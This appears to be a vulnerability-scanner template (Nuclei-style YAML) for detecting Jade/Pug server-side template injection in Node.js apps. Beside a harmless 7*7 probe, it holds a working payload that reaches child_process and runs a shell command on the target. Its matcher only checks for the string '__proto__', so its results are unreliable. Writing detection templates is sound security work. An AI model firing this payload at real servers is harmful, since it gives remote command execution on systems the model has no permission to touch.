id: ssti-jade-pug
info:
  name: SSTI Jade/Pug Template Engine
  author: AniipID
  severity: critical
  description: Detects Jade/Pug template injection in Node.js apps
  tags: ssti,jade,pug,nodejs
requests:
  - method: GET
    path:
      - "{{BaseURL}}?name=#{7*7}"
      - "{{BaseURL}}?name=#{\"\".__proto__.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}"
    matchers:
      - type: word
        words:
          - "__proto__"
        name: "jade-pug-ssti"
